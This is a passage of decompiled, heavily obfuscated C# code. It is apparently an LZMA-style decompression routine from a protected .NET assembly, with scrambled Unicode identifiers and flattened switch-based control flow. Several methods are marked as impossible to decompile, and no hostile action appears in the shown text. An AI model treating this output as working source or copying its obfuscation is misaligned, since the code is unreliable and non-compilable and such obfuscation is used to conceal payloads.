        鲘잉䡦ξꕒ틃ᒛ.\u2688\u09F2暜\u0C76聲\uF57B荑髪();
        *(int*) ((IntPtr) voidPtr + 52) = 50;
        continue;
label_46:
        *(int*) ((IntPtr) voidPtr + 16) = (int) *(uint*) ((IntPtr) voidPtr + 16) + (int) this.ဆ輆\uFFFD呣\uE60B\uE6B2漢ꐂ.뺻岶\uF0C1\uFFFD\u1CB9ᣖ셌\uE62A(this.\u1377徣綞蛾橯껪鞳㠟);
        *(int*) ((IntPtr) voidPtr + 52) = 14;
        continue;
label_47:
        *(long*) voidPtr = *(long*) voidPtr + 1L;
        *(int*) ((IntPtr) voidPtr + 52) = 49;
        continue;
label_48:
        *(long*) voidPtr = *(long*) voidPtr + 1L;
        *(int*) ((IntPtr) voidPtr + 52) = 6;
        continue;
label_49:
        if (this.ꐓ\uF4F4㚫ᰵ넙巯\uECA3䒱[(IntPtr) ((鲘잉䡦ξꕒ틃ᒛ.졩댬\u208C轰\u17FEᖺﺚ䜘 << 4) + *(uint*) ((IntPtr) voidPtr + 32))].䴚\u2EF9君\uFFFD\uED3E\uFFFD\uEF1A\uEEFC(this.\u1377徣綞蛾橯껪鞳㠟) == 0U)
        {
          *(int*) ((IntPtr) voidPtr + 52) = 40;
          continue;
        }
        goto label_26;
label_51:
        this.䁬㲙㓯蟒럅䉘梘\uE421.\uF2E7恡أﲢ\u0DCD\uEB85ੴ퉬(this.䁬㲙㓯蟒럅䉘梘\uE421.櫈Ӷꓵ䔓\u24D2Ⲳ誌姼(*(uint*) ((IntPtr) voidPtr + 16)));
        *(int*) ((IntPtr) voidPtr + 52) = 36;
        continue;
label_52:
        鲘잉䡦ξꕒ틃ᒛ = new \uF5D2\uE1EFᒆꟸ䇽ხ蚻蔦.鲘잉䡦ξꕒ틃ᒛ\u2569();
        *(int*) ((IntPtr) voidPtr + 52) = 33;
        continue;
label_53:
        鲘잉䡦ξꕒ틃ᒛ.\u28D5ꕽ\uF6C5\uF3A4\u1AEAᘗ\uE903\uA4CD();
        *(int*) ((IntPtr) voidPtr + 52) = 38;
        continue;
label_54:
        鲘잉䡦ξꕒ틃ᒛ.\u0F7C忷\uEED5쉤싈焁쿸碮();
        *(int*) ((IntPtr) voidPtr + 52) = 4;
        continue;
label_56:
        *(int*) ((IntPtr) voidPtr + 52) = 22;
        continue;
label_57:
        *(long*) voidPtr = 0L;
        *(long*) ((IntPtr) voidPtr + 8) = 穰콙患沎饺예믐ꎭ;
        if ((ulong) *(long*) voidPtr < (ulong) *(long*) ((IntPtr) voidPtr + 8))
        {
          *(int*) ((IntPtr) voidPtr + 52) = 28;
          continue;
        }
        goto label_67;
label_59:
        *(int*) ((IntPtr) voidPtr + 20) = 0;
        *(int*) ((IntPtr) voidPtr + 52) = 12;
        continue;
label_60:
        *(long*) voidPtr = *(long*) voidPtr + 1L;
        goto label_67;
label_62:
        *(int*) ((IntPtr) voidPtr + 40) = (int) *(uint*) ((IntPtr) voidPtr + 20);
        *(int*) ((IntPtr) voidPtr + 52) = 7;
        continue;
label_63:
        if ((ulong) *(uint*) ((IntPtr) voidPtr + 16) >= (ulong) *(long*) voidPtr || *(uint*) ((IntPtr) voidPtr + 16) >= this.\uFFFD㓆挒䅙ꖲ琔ᯊ顇)
        {
          if (*(uint*) ((IntPtr) voidPtr + 16) != uint.MaxValue)
          {
            *(int*) ((IntPtr) voidPtr + 52) = 48;
            continue;
          }
          goto label_68;
        }
label_66:
        this.䁬㲙㓯蟒럅䉘梘\uE421.烏\uE510᳑\u0E6E\u319F\uF1CB椊阸(*(uint*) ((IntPtr) voidPtr + 16), *(uint*) ((IntPtr) voidPtr + 36));
        *(long*) voidPtr = *(long*) voidPtr + (long) *(uint*) ((IntPtr) voidPtr + 36);
label_67:
        if ((ulong) *(long*) voidPtr < (ulong) *(long*) ((IntPtr) voidPtr + 8))
        {
          *(int*) ((IntPtr) voidPtr + 32) = (int) (uint) *(long*) voidPtr & (int) this.돢녺\u28AE쵢ᚩ\uEFDD\uF097泔;
          *(int*) ((IntPtr) voidPtr + 52) = 9;
          continue;
        }
label_68:
        this.䁬㲙㓯蟒럅䉘梘\uE421.\u2808昽\u22E2钼鲭Ⳇൢ픘();
        this.䁬㲙㓯蟒럅䉘梘\uE421.\u0FA4寘\uFFFDᜨ䫝\uFAF0䱗쓺();
        *(int*) ((IntPtr) voidPtr + 52) = 2;
        continue;
label_70:
        *(int*) ((IntPtr) voidPtr + 16) = 0;
        *(int*) ((IntPtr) voidPtr + 52) = 44;
        continue;
label_71:
        *(int*) ((IntPtr) voidPtr + 16) = (2 | (int) *(uint*) ((IntPtr) voidPtr + 44) & 1) << *(int*) ((IntPtr) voidPtr + 48);
        *(int*) ((IntPtr) voidPtr + 52) = 5;
        continue;
label_75:
        this.\u1377徣綞蛾橯껪鞳㠟.\u0FA4寘\uFFFDᜨ䫝\uFAF0䱗쓺();
        *(int*) ((IntPtr) voidPtr + 52) = 1;
      }
label_69:
      return;
label_5:
      return;
label_39:
      throw new Exception();
    }

    public unsafe void 殄낪璅쫯藛袒鋝盙(byte[] _param1)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(28);
label_7:
      *(int*) voidPtr = (int) _param1[0] % 9;
      *(int*) ((IntPtr) voidPtr + 24) = 5;
      while (true)
      {
        switch (*(int*) ((IntPtr) voidPtr + 24))
        {
          case 0:
            goto label_7;
          case 2:
            *(int*) ((IntPtr) voidPtr + 8) = *(int*) ((IntPtr) voidPtr + 4) % 5;
            *(int*) ((IntPtr) voidPtr + 24) = 4;
            continue;
          case 3:
            if (*(int*) ((IntPtr) voidPtr + 20) < 4)
              goto case 7;
            else
              goto label_2;
          case 4:
            *(int*) ((IntPtr) voidPtr + 12) = *(int*) ((IntPtr) voidPtr + 4) / 5;
            *(int*) ((IntPtr) voidPtr + 16) = 0;
            *(int*) ((IntPtr) voidPtr + 20) = 0;
            *(int*) ((IntPtr) voidPtr + 24) = 1;
            continue;
          case 5:
            *(int*) ((IntPtr) voidPtr + 4) = (int) _param1[0] / 9;
            *(int*) ((IntPtr) voidPtr + 24) = 2;
            continue;
          case 6:
            *(int*) ((IntPtr) voidPtr + 20) = *(int*) ((IntPtr) voidPtr + 20) + 1;
            *(int*) ((IntPtr) voidPtr + 24) = 3;
            continue;
          case 7:
            *(int*) ((IntPtr) voidPtr + 16) = (int) *(uint*) ((IntPtr) voidPtr + 16) + ((int) _param1[1 + *(int*) ((IntPtr) voidPtr + 20)] << *(int*) ((IntPtr) voidPtr + 20) * 8);
            *(int*) ((IntPtr) voidPtr + 24) = 6;
            continue;
          default:
            *(int*) ((IntPtr) voidPtr + 24) = 3;
            continue;
        }
      }
label_2:
      this.㢱챠蠟\u226F\uA4A3礜\uEFAC晰(*(uint*) ((IntPtr) voidPtr + 16));
      this.䲹㲀\uEC50釼㧖\uE341ꗊ詸(*(int*) ((IntPtr) voidPtr + 8), *(int*) voidPtr);
      this.ꅕ렑뽛貖㑔鋶㮟ᚥ(*(int*) ((IntPtr) voidPtr + 12));
    }

    private class ꈒ\u2A9D璸\u3334\uEE62\u0F02袪㵙
    {
      private \uF5D2\uE1EFᒆꟸ䇽ხ蚻蔦.齌㼪ॉ\uFE4B콳ᩬ禼ဏ \u2A67욆\uE2CFꞪ嗻證\uE946\uFE4C = new \uF5D2\uE1EFᒆꟸ䇽ხ蚻蔦.齌㼪ॉ\uFE4B콳ᩬ禼ဏ();
      private \uF5D2\uE1EFᒆꟸ䇽ხ蚻蔦.齌㼪ॉ\uFE4B콳ᩬ禼ဏ 逵蛯ᗚ兌\uEB07技\uE004䡎 = new \uF5D2\uE1EFᒆꟸ䇽ხ蚻蔦.齌㼪ॉ\uFE4B콳ᩬ禼ဏ();
      private \uF5D2\uE1EFᒆꟸ䇽ხ蚻蔦.텿\u0589睓ۥ\u2D2C\uF51Aᛀ\uA879[] 픿髧뿚뤌\uFFFD餵욕Α = new \uF5D2\uE1EFᒆꟸ䇽ხ蚻蔦.텿\u0589睓ۥ\u2D2C\uF51Aᛀ\uA879[new IntPtr(16)];
      private \uF5D2\uE1EFᒆꟸ䇽ხ蚻蔦.텿\u0589睓ۥ\u2D2C\uF51Aᛀ\uA879[] 纐傑婉簜購侶뢮紐 = new \uF5D2\uE1EFᒆꟸ䇽ხ蚻蔦.텿\u0589睓ۥ\u2D2C\uF51Aᛀ\uA879[new IntPtr(16)];
      private \uF5D2\uE1EFᒆꟸ䇽ხ蚻蔦.텿\u0589睓ۥ\u2D2C\uF51Aᛀ\uA879 璝母酄\u2F90\uF1B2鄓䫷㾄 = new \uF5D2\uE1EFᒆꟸ䇽ხ蚻蔦.텿\u0589睓ۥ\u2D2C\uF51Aᛀ\uA879(8);
      private uint \u17E0쌈\uEB06䬳ʠ憹徖\uFE69;

      public unsafe void \uE2AF莾īˀ뚷\uF7CD肩拄(uint _param1)
      {
        void* voidPtr;
        int num1;
        if (true)
        {
          int num2 = 8;
          if (num2 != 0)
          {
            // ISSUE: untyped stack allocation
            voidPtr = (void*) __untypedstackalloc(num2);
            goto label_15;
          }
          else
          {
            num1 = num2;
            goto label_8;
          }
        }
        else
          goto label_11;
label_4:
        int num3;
        switch (num3)
        {
          case 0:
            goto label_15;
          case 2:
            *(int*) voidPtr = (int) *(uint*) voidPtr + 1;
            *(int*) ((IntPtr) voidPtr + 4) = 4;
            goto label_16;
          case 3:
            this.\u17E0쌈\uEB06䬳ʠ憹徖\uFE69 = _param1;
            *(int*) ((IntPtr) voidPtr + 4) = 7;
            goto label_16;
          case 4:
            num1 = (int) *(uint*) voidPtr;
            break;
          case 5:
            goto label_11;
          case 6:
            this.纐傑婉簜購侶뢮紐[(IntPtr) *(uint*) voidPtr] = new \uF5D2\uE1EFᒆꟸ䇽ხ蚻蔦.텿\u0589睓ۥ\u2D2C\uF51Aᛀ\uA879(3);
            *(int*) ((IntPtr) voidPtr + 4) = 2;
            goto label_16;
          case 7:
            return;
          default:
            *(int*) ((IntPtr) voidPtr + 4) = 4;
            goto label_16;
        }
label_8:
        if (false)
        {
          num3 = num1;
          goto label_4;
        }
        else
        {
          int num4 = (int) _param1;
          *(int*) ((IntPtr) voidPtr + 4) = 5;
          if ((uint) num1 >= (uint) num4)
          {
            *(int*) ((IntPtr) voidPtr + 4) = 3;
            goto label_16;
          }
          else
            goto label_16;
        }
label_11:
        if (true)
          this.픿髧뿚뤌\uFFFD餵욕Α[(IntPtr) *(uint*) voidPtr] = new \uF5D2\uE1EFᒆꟸ䇽ხ蚻蔦.텿\u0589睓ۥ\u2D2C\uF51Aᛀ\uA879(3);
        *(int*) ((IntPtr) voidPtr + 4) = 6;
        goto label_16;
label_15:
        *(int*) voidPtr = (int) this.\u17E0쌈\uEB06䬳ʠ憹徖\uFE69;
        *(int*) ((IntPtr) voidPtr + 4) = 1;
label_16:
        num3 = *(int*) ((IntPtr) voidPtr + 4);
        goto label_4;
      }

      public unsafe void \u2688\u09F2暜\u0C76聲\uF57B荑髪()
      {
label_0:
        // ISSUE: untyped stack allocation
        void* voidPtr = (void*) __untypedstackalloc(8);
label_9:
        this.\u2A67욆\uE2CFꞪ嗻證\uE946\uFE4C.\u2688\u09F2暜\u0C76聲\uF57B荑髪();
        *(int*) ((IntPtr) voidPtr + 4) = 2;
        while (true)
        {
          do
          {
            switch (*(int*) ((IntPtr) voidPtr + 4))
            {
              case 0:
                goto label_9;
              case 2:
                *(int*) voidPtr = 0;
                break;
              case 3:
                goto label_4;
              case 4:
                goto label_8;
              case 5:
                goto label_6;
              case 6:
                goto label_7;
            }
            if (*(uint*) voidPtr >= this.\u17E0쌈\uEB06䬳ʠ憹徖\uFE69)
            {
              this.逵蛯ᗚ兌\uEB07技\uE004䡎.\u2688\u09F2暜\u0C76聲\uF57B荑髪();
              *(int*) ((IntPtr) voidPtr + 4) = 3;
            }
            else
              goto label_2;
          }
          while (true);
          goto label_5;
label_2:
          this.픿髧뿚뤌\uFFFD餵욕Α[(IntPtr) *(uint*) voidPtr].\u2688\u09F2暜\u0C76聲\uF57B荑髪();
          if (true)
          {
            *(int*) ((IntPtr) voidPtr + 4) = 5;
            continue;
          }
          goto label_0;
label_4:
          this.璝母酄\u2F90\uF1B2鄓䫷㾄.\u2688\u09F2暜\u0C76聲\uF57B荑髪();
          *(int*) ((IntPtr) voidPtr + 4) = 4;
          continue;
label_6:
          this.纐傑婉簜購侶뢮紐[(IntPtr) *(uint*) voidPtr].\u2688\u09F2暜\u0C76聲\uF57B荑髪();
          *(int*) ((IntPtr) voidPtr + 4) = 6;
          continue;
label_7:
          *(int*) voidPtr = (int) *(uint*) voidPtr + 1;
          *(int*) ((IntPtr) voidPtr + 4) = 1;
        }
label_8:
        return;
label_5:;
      }

      public uint 䴚\u2EF9君\uFFFD\uED3E\uFFFD\uEF1A\uEEFC(
        \uF5D2\uE1EFᒆꟸ䇽ხ蚻蔦.藙\u2EC9\uFFFD\uFE58\uF837Ḑ俔筏 _param1,
        uint _param2)
      {
        // ISSUE: unable to decompile the method.
      }
    }

    private class 潣丽閭틋ﱓ믥탊ॼ
    {
      private \uF5D2\uE1EFᒆꟸ䇽ხ蚻蔦.歔\u2B06蔫更\uFFFD㓣\uE6B0됟.潣丽閭틋ﱓ믥탊ॼ.ꆇ射㸙︦핎麊ᙕ硂[] 슞鐪䞏뱣︯\u1680屢辥;
      private int 鞄ﵝ\u0BDF劫\uFFFD䴇혿鯯;
      private int \uA908窶찟盢溚둗轥뻡;
      private uint 븊㱫䤈퇡鄡졍퉙激;

      public unsafe void \uE2AF莾īˀ뚷\uF7CD肩拄(int _param1, int _param2)
      {
        // ISSUE: untyped stack allocation
        void* voidPtr = (void*) __untypedstackalloc(12);
label_13:
        \uF5D2\uE1EFᒆꟸ䇽ხ蚻蔦.歔\u2B06蔫更\uFFFD㓣\uE6B0됟.潣丽閭틋ﱓ믥탊ॼ.ꆇ射㸙︦핎麊ᙕ硂[] 슞鐪䞏뱣︯屢辥 = this.슞鐪䞏뱣︯\u1680屢辥;
        *(int*) ((IntPtr) voidPtr + 8) = 7;
        if (슞鐪䞏뱣︯屢辥 != null)
          *(int*) ((IntPtr) voidPtr + 8) = 6;
        while (true)
        {
          int num1;
          int num2;
          switch (*(int*) ((IntPtr) voidPtr + 8))
          {
            case 0:
              goto label_13;
            case 2:
              *(int*) voidPtr = 1 << this.鞄ﵝ\u0BDF劫\uFFFD䴇혿鯯 + this.\uA908窶찟盢溚둗轥뻡;
              *(int*) ((IntPtr) voidPtr + 8) = 4;
              continue;
            case 3:
              this.븊㱫䤈퇡鄡졍퉙激 = (uint) ((1 << _param1) - 1);
              this.鞄ﵝ\u0BDF劫\uFFFD䴇혿鯯 = _param2;
              *(int*) ((IntPtr) voidPtr + 8) = 2;
              continue;
            case 4:
              this.슞鐪䞏뱣︯\u1680屢辥 = new \uF5D2\uE1EFᒆꟸ䇽ხ蚻蔦.歔\u2B06蔫更\uFFFD㓣\uE6B0됟.潣丽閭틋ﱓ믥탊ॼ.ꆇ射㸙︦핎麊ᙕ硂[(IntPtr) *(uint*) voidPtr];
              *(int*) ((IntPtr) voidPtr + 8) = 5;
              continue;
            case 5:
              *(int*) ((IntPtr) voidPtr + 4) = 0;
              goto default;
            case 6:
              if (this.鞄ﵝ\u0BDF劫\uFFFD䴇혿鯯 == _param2)
              {
                int num3 = this.\uA908窶찟盢溚둗轥뻡;
                int num4 = _param1;
                if (false)
                {
                  num2 = num4;
                  num1 = num3;
                  break;
                }
                if (num3 != num4)
                  goto case 7;
                else
                  goto label_2;
              }
              else
                goto case 7;
            case 7:
              if (true)
              {
                this.\uA908窶찟盢溚둗轥뻡 = _param1;
                *(int*) ((IntPtr) voidPtr + 8) = 3;
                continue;
              }
              goto case 2;
            default:
              num1 = (int) *(uint*) ((IntPtr) voidPtr + 4);
              num2 = (int) *(uint*) voidPtr;
              break;
          }
          if ((uint) num1 < (uint) num2)
          {
            this.슞鐪䞏뱣︯\u1680屢辥[(IntPtr) *(uint*) ((IntPtr) voidPtr + 4)].\uE2AF莾īˀ뚷\uF7CD肩拄();
            *(int*) ((IntPtr) voidPtr + 4) = (int) *(uint*) ((IntPtr) voidPtr + 4) + 1;
            *(int*) ((IntPtr) voidPtr + 8) = 1;
          }
          else
            break;
        }
        return;
label_2:;
      }

      public unsafe void \u2688\u09F2暜\u0C76聲\uF57B荑髪()
      {
        do
        {
          int num1 = 12;
          while (true)
          {
            // ISSUE: untyped stack allocation
            void* voidPtr = (void*) __untypedstackalloc(num1);
label_8:
            *(int*) voidPtr = 1 << this.鞄ﵝ\u0BDF劫\uFFFD䴇혿鯯 + this.\uA908窶찟盢溚둗轥뻡;
            if (true)
              goto label_9;
label_7:
            *(int*) ((IntPtr) voidPtr + 4) = 0;
            *(int*) ((IntPtr) voidPtr + 8) = 1;
            goto label_10;
label_9:
            *(int*) ((IntPtr) voidPtr + 8) = 2;
label_10:
            switch (*(int*) ((IntPtr) voidPtr + 8))
            {
              case 0:
                goto label_8;
              case 2:
                goto label_7;
              default:
                int num2;
                while (true)
                {
                  num2 = (int) *(uint*) ((IntPtr) voidPtr + 4);
                  if (true)
                  {
                    int num3 = (int) *(uint*) voidPtr;
                    if ((uint) num2 < (uint) num3)
                    {
                      this.슞鐪䞏뱣︯\u1680屢辥[(IntPtr) *(uint*) ((IntPtr) voidPtr + 4)].\u2688\u09F2暜\u0C76聲\uF57B荑髪();
                      *(int*) ((IntPtr) voidPtr + 4) = (int) *(uint*) ((IntPtr) voidPtr + 4) + 1;
                    }
                    else
                      goto label_6;
                  }
                  else
                    break;
                }
                num1 = num2;
                continue;
            }
          }
label_6:;
        }
        while (false);
      }

      private uint 䢿旆㞇䑦쪘䏄뾭뛻(uint _param1, byte _param2)
      {
        int num1 = (int) _param1;
        int num2;
        int num3;
        while (true)
        {
          num2 = (int) this.븊㱫䤈퇡鄡졍퉙激;
          if (true)
          {
            num3 = num1 & num2;
            if (false)
              num1 = num3;
            else
              goto label_11;
          }
          else
            break;
        }
label_9:
        return (uint) (num1 + num2);
label_11:
        int num4 = this.鞄ﵝ\u0BDF劫\uFFFD䴇혿鯯 & 31;
        while (true)
        {
          int num5 = num3 << num4;
          int num6 = (int) _param2;
          if (false)
          {
            num4 = num6;
            num3 = num5;
          }
          else
          {
            int num7 = 8;
            int num8 = this.鞄ﵝ\u0BDF劫\uFFFD䴇혿鯯;
            int num9;
            int num10;
            while (true)
            {
              num9 = num7 - num8;
              num10 = 31;
              if (num10 == 0)
              {
                num8 = num10;
                num7 = num9;
              }
              else
                break;
            }
            int num11 = num9 & num10;
            num2 = num6 >> num11;
            num1 = num5;
            goto label_9;
          }
        }
        num2 = num4;
        num1 = num3;
        goto label_9;
      }

      public byte 봍ꛑ쾬Ꮡ\uFFFD魅य़㥯(
        \uF5D2\uE1EFᒆꟸ䇽ხ蚻蔦.藙\u2EC9\uFFFD\uFE58\uF837Ḑ俔筏 _param1,
        uint _param2,
        byte _param3)
      {
        // ISSUE: unable to decompile the method.
      }

      public byte ꧯ\u298B햏挒쉟\uFFFD撊娦(
        \uF5D2\uE1EFᒆꟸ䇽ხ蚻蔦.藙\u2EC9\uFFFD\uFE58\uF837Ḑ俔筏 _param1,
        uint _param2,
        byte _param3,
        byte _param4)
      {
        return this.슞鐪䞏뱣︯\u1680屢辥[(IntPtr) this.䢿旆㞇䑦쪘䏄뾭뛻(_param2, _param3)].ꧯ\u298B햏挒쉟\uFFFD撊娦(_param1, _param4);
      }

      public 潣丽閭틋ﱓ믥탊ॼ()
      {
label_0:
        // ISSUE: explicit constructor call
        base.\u002Ector();
        switch (1)
        {
          case 0:
            goto label_0;
        }
      }

      private struct ꆇ射㸙︦핎麊ᙕ硂
      {
        private \uF5D2\uE1EFᒆꟸ䇽ხ蚻蔦.齌㼪ॉ\uFE4B콳ᩬ禼ဏ[] 曹䚦ꠒ\u33A5\u2F10\u32C6崄䂥;

        public void \uE2AF莾īˀ뚷\uF7CD肩拄()
        {
label_0:
          do
          {
            this.曹䚦ꠒ\u33A5\u2F10\u32C6崄䂥 = new \uF5D2\uE1EFᒆꟸ䇽ხ蚻蔦.齌㼪ॉ\uFE4B콳ᩬ禼ဏ[768];
          }
          while (false);
          int num = 1;
          do
          {
            switch (num)
            {
              case 0:
                goto label_0;
              default:
                if (false)
                {
                  do
                    ;
                  while (false);
                  continue;
                }
                goto label_4;
            }
          }
          while (false);
          goto label_3;
label_4:
          return;
label_3:;
        }

        public unsafe void \u2688\u09F2暜\u0C76聲\uF57B荑髪()
        {
          // ISSUE: untyped stack allocation
          void* voidPtr = (void*) __untypedstackalloc(8);
label_4:
          *(int*) voidPtr = 0;
          *(int*) ((IntPtr) voidPtr + 4) = 1;
          while (true)
          {
            int num;
            do
            {
              switch (*(int*) ((IntPtr) voidPtr + 4))
              {
                case 0:
                  goto label_4;
                case 2:
                  goto label_1;
                case 3:
                  num = *(int*) voidPtr;
                  *(int*) ((IntPtr) voidPtr + 4) = 4;
                  continue;
                case 4:
                  goto label_3;
                default:
                  *(int*) ((IntPtr) voidPtr + 4) = 3;
                  continue;
              }
            }
            while (num < 768);
            *(int*) ((IntPtr) voidPtr + 4) = 2;
            continue;
label_3:
            this.曹䚦ꠒ\u33A5\u2F10\u32C6崄䂥[*(int*) voidPtr].\u2688\u09F2暜\u0C76聲\uF57B荑髪();
            *(int*) voidPtr = *(int*) voidPtr + 1;
            *(int*) ((IntPtr) voidPtr + 4) = 3;
          }
label_1:;
        }

        public unsafe byte 봍ꛑ쾬Ꮡ\uFFFD魅य़㥯(
          \uF5D2\uE1EFᒆꟸ䇽ხ蚻蔦.藙\u2EC9\uFFFD\uFE58\uF837Ḑ俔筏 _param1)
        {
          void* voidPtr;
          if (true)
          {
            // ISSUE: untyped stack allocation
            voidPtr = (void*) __untypedstackalloc(8);
          }
label_11:
          *(int*) voidPtr = 1;
label_12:
          *(int*) voidPtr = (int) *(uint*) voidPtr << 1 | (int) this.曹䚦ꠒ\u33A5\u2F10\u32C6崄䂥[(IntPtr) *(uint*) voidPtr].䴚\u2EF9君\uFFFD\uED3E\uFFFD\uEF1A\uEEFC(_param1);
          int num1 = (int) *(uint*) voidPtr;
          int num2;
          while (true)
          {
            if ((uint) num1 >= 256U)
            {
              *(int*) ((IntPtr) voidPtr + 4) = 1;
              num2 = *(int*) ((IntPtr) voidPtr + 4);
              do
              {
                if (true)
                {
                  if (true)
                  {
                    switch (num2)
                    {
                      case 0:
                        goto label_11;
                      default:
                        num2 = (int) (byte) *(uint*) voidPtr;
                        break;
                    }
                  }
                  else
                    goto label_2;
                }
              }
              while (false);
              break;
label_2:
              num1 = num2;
            }
            else
              goto label_12;
          }
          return (byte) num2;
        }

        public unsafe byte ꧯ\u298B햏挒쉟\uFFFD撊娦(
          \uF5D2\uE1EFᒆꟸ䇽ხ蚻蔦.藙\u2EC9\uFFFD\uFE58\uF837Ḑ俔筏 _param1,
          byte _param2)
        {
          // ISSUE: untyped stack allocation
          IntPtr num1 = __untypedstackalloc(16);
          void* voidPtr;
          if (true)
            voidPtr = (void*) num1;
label_14:
          *(int*) voidPtr = 1;
label_15:
          *(int*) ((IntPtr) voidPtr + 4) = (int) _param2 >> 7 & 1;
          if (false)
            goto label_10;
          else
            goto label_16;
label_2:
          *(int*) ((IntPtr) voidPtr + 12) = 4;
          int num2;
          int num3;
          if (num2 != num3)
          {
            *(int*) ((IntPtr) voidPtr + 12) = 5;
            goto label_17;
          }
          else
            goto label_17;
label_10:
          while (true)
          {
            num2 = (int) *(uint*) voidPtr;
            num3 = 256;
            if (num3 != 0)
            {
              if ((uint) num2 < (uint) num3)
                *(int*) voidPtr = (int) *(uint*) voidPtr << 1 | (int) this.曹䚦ꠒ\u33A5\u2F10\u32C6崄䂥[(IntPtr) *(uint*) voidPtr].䴚\u2EF9君\uFFFD\uED3E\uFFFD\uEF1A\uEEFC(_param1);
              else
                break;
            }
            else
              goto label_2;
          }
          *(int*) ((IntPtr) voidPtr + 12) = 3;
          goto label_17;
label_16:
          *(int*) ((IntPtr) voidPtr + 12) = 2;
label_17:
          while (true)
          {
            switch (*(int*) ((IntPtr) voidPtr + 12))
            {
              case 0:
                goto label_14;
              case 2:
                _param2 <<= 1;
                *(int*) ((IntPtr) voidPtr + 8) = (int) this.曹䚦ꠒ\u33A5\u2F10\u32C6崄䂥[(IntPtr) ((uint) (1 + (int) *(uint*) ((IntPtr) voidPtr + 4) << 8) + *(uint*) voidPtr)].䴚\u2EF9君\uFFFD\uED3E\uFFFD\uEF1A\uEEFC(_param1);
                break;
              case 3:
                goto label_6;
              case 4:
                if (*(uint*) voidPtr >= 256U)
                {
                  *(int*) ((IntPtr) voidPtr + 12) = 3;
                  continue;
                }
                goto label_15;
              case 5:
                goto label_10;
              default:
                if (false)
                  break;
                goto label_18;
            }
            *(int*) voidPtr = (int) *(uint*) voidPtr << 1 | (int) *(uint*) ((IntPtr) voidPtr + 8);
            *(int*) ((IntPtr) voidPtr + 12) = 1;
          }
label_6:
          return (byte) *(uint*) voidPtr;
label_18:
          int num4 = (int) *(uint*) ((IntPtr) voidPtr + 4);
          num3 = (int) *(uint*) ((IntPtr) voidPtr + 8);
          num2 = num4;
          goto label_2;
        }
      }
    }
  }
}
